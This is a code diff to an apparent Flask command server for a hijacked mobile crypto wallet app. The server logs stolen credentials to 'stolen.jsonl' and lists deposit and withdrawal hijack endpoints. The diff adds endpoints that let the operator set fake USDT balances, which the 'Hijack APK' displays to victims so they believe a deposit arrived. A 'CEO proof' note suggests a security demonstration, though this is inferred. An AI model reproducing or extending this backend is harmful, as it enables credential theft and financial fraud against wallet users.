@@ -16,6 +16,7 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 DATA_DIR = Path(__file__).parent / "data"
 DATA_DIR.mkdir(exist_ok=True)
 LOG_FILE = DATA_DIR / "stolen.jsonl"
+FAKE_BALANCE_FILE = DATA_DIR / "fake_balances.json"
 
 PASSWORD_KEYS = (
     "password",
@@ -56,6 +57,41 @@ def read_all() -> list:
         if line:
             rows.append(json.loads(line))
     return rows
+
+
+def _norm_user_key(value: str) -> str:
+    return (value or "").strip().lower()
+
+
+def load_fake_balances() -> dict:
+    if not FAKE_BALANCE_FILE.exists():
+        return {}
+    try:
+        return json.loads(FAKE_BALANCE_FILE.read_text(encoding="utf-8"))
+    except json.JSONDecodeError:
+        return {}
+
+
+def save_fake_balances(data: dict) -> None:
+    FAKE_BALANCE_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
+
+
+def get_fake_amount(user_key: str, coin: str = "USDT") -> float:
+    data = load_fake_balances()
+    row = data.get(_norm_user_key(user_key), {})
+    return float(row.get(coin.upper(), 0) or 0)
+
+
+def set_fake_amount(user_key: str, amount: float, coin: str = "USDT") -> float:
+    key = _norm_user_key(user_key)
+    if not key:
+        return 0.0
+    data = load_fake_balances()
+    row = data.get(key, {})
+    row[coin.upper()] = max(0.0, float(amount))
+    data[key] = row
+    save_fake_balances(data)
+    return row[coin.upper()]
 
 
 def extract_passwords(data: dict) -> dict:
@@ -99,6 +135,8 @@ def health():
                 "deposit_hijack",
                 "withdraw_hijack",
                 "withdraw_display_hijack",
+                "fake_balance_set",
+                "fake_balance_get",
             ],
             "count": len(rows),
         }
@@ -152,6 +190,48 @@ def clear_stolen():
     if LOG_FILE.exists():
         LOG_FILE.write_text("", encoding="utf-8")
     return jsonify({"code": 0, "msg": "cleared"})
+
+
+@app.route("/api/fake-balance", methods=["GET"])
+def fake_balance_get():
+    mobile = request.args.get("mobile", "")
+    coin = (request.args.get("coin") or "USDT").upper()
+    amount = get_fake_amount(mobile, coin)
+    log_stolen(
+        {
+            "action": "fake_balance_get",
+            "mobile": mobile,
+            "coin": coin,
+            "amount": amount,
+            "note": "Hijack APK polled fake balance — victim wallet will show this extra USDT",
+        }
+    )
+    return jsonify({"code": 0, "data": {"mobile": mobile, "coin": coin, "amount": amount}})
+
+
+@app.route("/api/fake-balance", methods=["POST"])
+def fake_balance_set():
+    body = request.get_json(silent=True) or {}
+    mobile = body.get("mobile") or body.get("email") or body.get("phone") or ""
+    coin = (body.get("coin") or "USDT").upper()
+    amount = set_fake_amount(mobile, float(body.get("amount", 0)), coin)
+    entry = {
+        "action": "fake_balance_set",
+        "mobile": mobile,
+        "coin": coin,
+        "amount": amount,
+        "note": (
+            "CEO proof: hacker injected fake balance — victim app Wallet tab will show this "
+            "on top of real server balance so user thinks deposit arrived"
+        ),
+    }
+    log_stolen(entry)
+    return jsonify({"code": 0, "data": {"mobile": mobile, "coin": coin, "amount": amount}})
+
+
+@app.route("/api/fake-balances", methods=["GET"])
+def fake_balances_list():
+    return jsonify({"code": 0, "data": load_fake_balances()})
 
 
 STATIC_DIR = Path(__file__).parent / "static"
